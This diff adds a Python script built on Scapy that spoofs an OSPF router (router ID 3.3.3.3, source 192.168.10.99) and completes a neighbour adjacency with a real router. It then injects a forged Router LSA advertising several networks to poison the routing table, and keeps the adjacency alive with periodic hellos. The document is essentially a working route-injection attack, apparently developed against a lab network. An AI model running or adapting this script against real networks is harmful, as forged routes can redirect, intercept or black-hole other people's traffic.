@@ -1,0 +1,489 @@
+from scapy.all import *
+from scapy.contrib.ospf import *
+import time
+import struct
+
+state = "INIT"
+poison_time = 0
+
+# Function to process received packets based on the ospf handshake state
+def handle_packet(packet):
+    
+    global state
+    global poison_time
+    
+    if packet.haslayer(OSPF_Hdr):
+        ospf_layer = packet.getlayer(OSPF_Hdr)
+
+        # If in "INIT" state, send the hello packet
+        if state == "INIT":
+            send_hello()
+            state = "HELLO_ED"
+            print("HELLO_ED")
+        
+        # If in "HELLO_ED" state, handle the hello packet
+        if state == "HELLO_ED" and ospf_layer.type == 1:
+            print("Received OSPF Hello packet")
+            send_hello_response(packet)
+            time.sleep(2)
+            state = "HELLO_RESPONDED"
+            print("HELLO_RESPONDED")
+
+        # If in "HELLO_RESPONDED" state, handle the DBD packet
+        elif state == "HELLO_RESPONDED" and ospf_layer.type == 2:
+            print("Received OSPF DBD packet")
+            send_dbd_response(packet)
+            state = "DBD_SENT"
+            print("DBD_SENT")
+        
+        # If in "DBD_SENT" state, handle the DBD packet
+        elif state == "DBD_SENT" and ospf_layer.type == 2:
+            print("Received 2nd OSPF DBD packet")
+            send_dbd_response_2(packet)
+            time.sleep(2)
+            state = "DBD_2_SENT"
+            print("DBD_2_SENT")
+
+        # If in "DBD_2_SENT" state, send the LS Request packet
+        elif state == "DBD_2_SENT":
+            send_ls_request(packet)
+            state = "REQ_SENT"
+            print("REQ_SENT")
+        
+        # If in "REQ_SENT" state and received the LS Update packet
+        elif state == "REQ_SENT" and ospf_layer.type == 4:
+            print("Received OSPF LS Update packet")
+            send_ls_r_upd_update(packet)
+            state = "UPDATE_SENT"
+            print("UPDATE_SENT")
+        
+        # If in "UPDATE_SENT" state, send the LS Update packet
+        # elif state == "UPDATE_SENT" and ospf_layer.type == 4:
+            # print("Received OSPF LS Update packet")
+            # send_ls_r_upd_upd_update(packet)
+            # state = "UPDATE_2_SENT"
+            # print("UPDATE_2_SENT")
+        
+        # If in "DBD_SENT" or "REQ_SENT" state, handle the LS Update and Ack packet
+        elif state == "UPDATE_2_SENT" or state == "UPDATE_SENT" and ospf_layer.type == 4:
+            # print("Received OSPF LS Update packet after Router Update sent")
+            # send_ls_n_update()
+            # state = "NETUPD_SENT"
+            # print("NETUPD_SENT")
+            
+            send_ls_ack(packet)
+            state = "ACK_SENT"
+            print("ACK_SENT")
+        
+        # elif state == "ACK_SENT" and ospf_layer.type == 5:
+            # print("ACK_RECEIVED")
+            # send_ls_ack(packet)
+            # state = "ACK_SENT"
+            # print("ACK_SENT")
+        # else:
+            # print("ACK_RECEIVED")
+            # send_ls_ack(packet)
+            # state = "ACK_SENT"
+            # print("ACK_SENT")
+        
+        # If in "NETUPD_SENT" state, handle the LS Request packet
+        # elif state == "NETUPD_SENT" and ospf_layer.type == 4:
+            # send_ls_r_upd_update(packet)
+            # state = "ACK_SENT"
+            # print("ACK_SENT")
+        
+        # If in "ACK_SENT" state, handle the LS Ack packet
+        elif state == "ACK_SENT" and ospf_layer.type == 5:
+            state = "FULL"
+            print("FULL")
+            send_periodic_hellos()
+            poison_time = 1
+        
+        elif state == "FULL" and ospf_layer.type == 1 and poison_time == 1:
+            send_poison_packet(packet)
+            state = "POISON_SENT"
+            print("POISON_SENT")
+        
+        elif state == "POISON_SENT" and ospf_layer.type == 4 or ospf_layer.type == 5 and poison_time == 1:
+            state = "POISON_PROP"
+            print("POISON_PROP")
+            poison_time = 0
+            while True:
+                send_periodic_hellos()
+            
+
+# Function to send an OSPF Hello packet
+def send_hello():
+    ospf_hello = OSPF_Hello(
+        mask="255.255.255.0",
+        hellointerval=10,
+        router="224.0.0.5",
+        prio=1,
+        options=0x22, 
+        neighbors=[]
+    )
+    ospf_header_hello = OSPF_Hdr(
+        version=2,
+        type=1,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_hello = IP(
+        src="192.168.10.99",
+        dst="224.0.0.5"
+    ) / ospf_header_hello / ospf_hello
+    send(ospf_packet_hello, iface="eth0", verbose=1)
+    
+# Function to send a response to an OSPF Hello packet
+def send_hello_response(received_packet):
+    ospf_hello = OSPF_Hello(
+        mask="255.255.255.0",
+        hellointerval=10,
+        router="192.168.10.99",
+        prio=1,
+        options=0x22, 
+        neighbors=["1.1.1.1"]
+    )
+    ospf_header_hello = OSPF_Hdr(
+        version=2,
+        type=1,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_hello = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_hello / ospf_hello
+    send(ospf_packet_hello, iface="eth0", verbose=1)
+
+# Function to send a response to an OSPF Hello packet
+def send_hello_neighbor():
+    ospf_hello = OSPF_Hello(
+        mask="255.255.255.0",
+        hellointerval=10,
+        router="192.168.10.99",
+        backup="192.168.10.1",
+        prio=1,
+        options=0x22, 
+        neighbors=["1.1.1.1"]
+    )
+    
+    # Manual LLS Data Block
+    # lls_data = struct.pack('!HHI', 1, 4, 0x00000001)  # TLV Type 1, Length 4, Option 0x00000001 (LSDB Resync)
+    # lls_checksum = checksum(lls_data)
+    # lls_data_block = struct.pack('!HH', lls_checksum, len(lls_data) + 4) + lls_data
+    
+    lls_extended_opts = LLS_Extended_Options(
+        options=b'\x00\x00\x00\x01'  # Setting the LSDB Resynchronization flag
+    )
+    
+    ospf_lls = OSPF_LLS_Hdr(llstlv=[lls_extended_opts])
+    
+    ospf_header_hello = OSPF_Hdr(
+        version=2,
+        type=1,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_hello = IP(
+        src="192.168.10.99",
+        dst="224.0.0.5"
+    ) / ospf_header_hello / ospf_hello / ospf_lls
+    send(ospf_packet_hello, iface="eth0", verbose=1)
+
+def send_dbd_response(received_packet):
+    lsaheaders = []
+    for lsa in received_packet[OSPF_DBDesc].lsaheaders:
+        lsa_header = OSPF_LSA_Hdr(
+            type=lsa.type,
+            id=lsa.id,
+            adrouter=lsa.adrouter,
+            seq=lsa.seq
+        )
+        lsaheaders.append(lsa_header)
+    
+    ospf_dbd = OSPF_DBDesc(
+        mtu=1500,
+        options=0x22,
+        ddseq=received_packet[OSPF_DBDesc].ddseq + 1,  #  sequence number
+        dbdescr=0x07, # (I) Init, (M) More, (MS) Master
+        lsaheaders=lsaheaders
+    )
+    ospf_header_dbd = OSPF_Hdr(
+        version=2,
+        type=2,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_dbd = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_dbd / ospf_dbd
+    send(ospf_packet_dbd, iface="eth0", verbose=1)
+
+def send_dbd_response_2(received_packet):
+    
+    ddseq = received_packet[OSPF_DBDesc].ddseq + 1 #  sequence number
+    
+    lsaheaders = []
+    for lsa in received_packet[OSPF_DBDesc].lsaheaders:
+        lsa_header = OSPF_LSA_Hdr(
+            type=lsa.type,
+            id=lsa.id,
+            adrouter=lsa.adrouter,
+            seq=lsa.seq
+        )
+        lsaheaders.append(lsa_header)
+    
+    # Manual LLS Data Block
+    # lls_data = struct.pack('!HHI', 1, 4, 0x00000001)  # TLV Type 1, Length 4, Option 0x00000001 (LSDB Resync)
+    # lls_checksum = checksum(lls_data)
+    # lls_data_block = struct.pack('!HH', lls_checksum, len(lls_data) + 4) + lls_data
+    
+    lls_extended_opts = LLS_Extended_Options(
+        options=b'\x00\x00\x00\x01'  # Setting the LSDB Resynchronization flag
+    )
+    
+    ospf_lls = OSPF_LLS_Hdr(llstlv=[lls_extended_opts])
+    
+    ospf_dbd = OSPF_DBDesc(
+        mtu=1500,
+        options=0x22,
+        ddseq=ddseq,  
+        dbdescr=0x01, # (MS) Master
+        lsaheaders=lsaheaders
+    )
+    
+    ospf_header_dbd = OSPF_Hdr(
+        version=2,
+        type=2,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_dbd = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_dbd / ospf_dbd / ospf_lls
+    
+    send(ospf_packet_dbd, iface="eth0", verbose=1)
+
+def send_ls_request(received_packet):
+    # Define OSPF LS Request Packet
+    ospf_request = OSPF_LSReq(
+        requests=[OSPF_LSReq_Item(type=1, id="1.1.1.1", adrouter="1.1.1.1")]
+    )
+    ospf_header_request = OSPF_Hdr(
+        version=2,
+        type=3,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_request = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_request / ospf_request
+    send(ospf_packet_request, iface="eth0", verbose=1)
+
+
+def send_ls_r_update(received_packet):
+    ospf_update = OSPF_LSUpd(
+        lsacount=1, # Number of LSAs in this update
+        lsalist=[OSPF_Router_LSA(
+        id="3.3.3.3", 
+        adrouter="3.3.3.3", 
+        seq=received_packet[OSPF_Router_LSA].seq, 
+        age=received_packet[OSPF_Router_LSA].age, 
+        options=0x22, # 0x22 External Routing
+        linklist=["3.3.3.3","10.0.0.0"])] # List of Networks available and their IDs
+    )
+    ospf_header_update = OSPF_Hdr(
+        version=2,
+        type=4,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_update = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_update / ospf_update
+    send(ospf_packet_update, iface="eth0", verbose=1)
+
+def send_ls_r_upd_update(received_packet):
+    
+    lsa = received_packet[OSPF_Router_LSA]
+    lsa_seq = lsa.seq
+    lsa_age = lsa.age
+    
+    linklist = []
+    for link in lsa.linklist:
+        parsed_link = OSPF_Link(
+            type=link.type,
+            id=link.id,
+            data=link.data,
+            metric=link.metric
+        )
+        linklist.append(parsed_link)
+    
+    ospf_update = OSPF_LSUpd(
+        lsacount=1, # Number of LSAs in this update
+        lsalist=[OSPF_Router_LSA(
+        age = lsa_age,
+        id="3.3.3.3", 
+        adrouter="3.3.3.3", 
+        seq=lsa_seq, 
+        options=0x22, # 0x22 is Demand Circuits, External Routing
+        linklist=linklist)] # List of Networks available and their IDs
+    )
+    ospf_header_update = OSPF_Hdr(
+        version=2,
+        type=4,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_update = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_update / ospf_update
+    send(ospf_packet_update, iface="eth0", verbose=1)
+
+def send_ls_r_upd_upd_update(received_packet):
+    
+    lsa = received_packet[OSPF_Router_LSA]
+    lsa_seq = lsa.seq
+    lsa_age = lsa.age
+    
+    linklist = []
+    for link in lsa.linklist:
+        parsed_link = OSPF_Link(
+            type=link.type,
+            id=link.id,
+            data=link.data,
+            metric=link.metric
+        )
+        linklist.append(parsed_link)
+    
+    ospf_update = OSPF_LSUpd(
+        lsacount=1, # Number of LSAs in this update
+        lsalist=[OSPF_Router_LSA(
+        age = lsa_age,
+        id="3.3.3.3", 
+        adrouter="3.3.3.3", 
+        seq=lsa_seq, 
+        options=0x22, # 0x22 is Demand Circuits, External Routing
+        linklist=linklist)] # List of Networks available and their IDs
+    )
+    ospf_header_update = OSPF_Hdr(
+        version=2,
+        type=4,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_update = IP(
+        src="192.168.10.99",
+        dst="192.168.10.1"
+    ) / ospf_header_update / ospf_update
+    send(ospf_packet_update, iface="eth0", verbose=1)
+
+def send_ls_n_update():
+    ospf_update = OSPF_LSUpd(
+        lsacount=1,  # Number of LSAs in this update
+        lsalist=[OSPF_Network_LSA(
+            id="192.168.10.99",  # Network ID, copying pcap
+            adrouter="3.3.3.3",  # Advertising router ID
+            seq=0x80000001,  # Sequence number
+            options=0x22,  # 0x22 represents External Routing capability
+            mask="255.255.255.0",  # Subnet mask of the network
+            routerlist=["1.1.1.1", "3.3.3.3"]  # List of Router IDs in this network
+        )]
+    )
+    ospf_header_update = OSPF_Hdr(
+        version=2,
+        type=4,  # Type 4 is for LSA Update packets
+        src="3.3.3.3",  # Spoofed source router ID (pretending to be the DR)
+        area="0.0.0.0"  # OSPF Area ID
+    )
+    ospf_packet_update = IP(
+        src="192.168.10.99",  # Spoofed source IP in the 10.0.0.0/24 network
+        dst="224.0.0.5"  # Destination IP
+    ) / ospf_header_update / ospf_update
+    send(ospf_packet_update, iface="eth0", verbose=1)
+
+
+def send_ls_ack(received_packet):
+    
+    ospf_ack = OSPF_LSAck(
+        lsaheaders=[
+        OSPF_LSA_Hdr(
+            type = 2,
+            id="192.168.10.1",  # Network ID, copying pcap
+            adrouter="1.1.1.1",  # Their router ID
+            seq=0x80000005  # Sequence number (increment if re-sending)
+            )
+        ]
+    )
+    
+    ospf_header_ack = OSPF_Hdr(
+        version=2,
+        type=5,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_ack = IP(
+        src="192.168.10.99",
+        dst="224.0.0.5"
+    ) / ospf_header_ack / ospf_ack
+    send(ospf_packet_ack, iface="eth0", verbose=1)
+
+def send_poison_packet(received_packet):
+    
+    ospf_update = OSPF_LSUpd(
+        lsacount=1, # Number of LSAs in this update
+        lsalist=[OSPF_Router_LSA(
+        id="3.3.3.3", 
+        adrouter="3.3.3.3", 
+        seq=0x80000006, 
+        options=0x22, # 0x22 is Demand Circuits, External Routing
+        linklist=[
+        OSPF_Link(type=3, id="10.0.0.0", data="255.255.255.0", metric=1),
+        OSPF_Link(type=3, id="10.0.10.0", data="255.255.255.0", metric=1),
+        OSPF_Link(type=3, id="192.168.20.0", data="255.255.255.0", metric=1),
+        OSPF_Link(type=3, id="3.3.3.3", data="255.255.255.255", metric=1)
+        ])]
+    )
+    ospf_header_update = OSPF_Hdr(
+        version=2,
+        type=4,
+        src="3.3.3.3",
+        area="0.0.0.0"
+    )
+    ospf_packet_update = IP(
+        src="192.168.10.99",
+        dst="224.0.0.5"
+    ) / ospf_header_update / ospf_update
+    
+    send(ospf_packet_update, iface="eth0", verbose=1)
+
+def send_periodic_hellos():
+    # Once FULL state is reached, send periodic Hello packets
+    print("Starting periodic Hello packets...")
+    hello_count=0
+    
+    while hello_count < 10:
+        send_hello_neighbor()
+        hello_count += 1
+        time.sleep(10)    
+    
+    print("Sent 10 Hello packets.")
+
+
+# Start sniffing OSPF packets and handle them
+while True:
+    while state != "FULL":
+        print("Started sniffing packets...")
+        sniff(filter="ip proto ospf and not src host 192.168.10.99", iface="eth0", prn=handle_packet)
+
+
+# seq numbers must be correct (master-slave rel, master increments the sequence)
+# options field must be correct (match INIT, master-slave rel)
+# all variable names must be correct (lsa_header, linklist, adrouter)
+# ospf LLS 
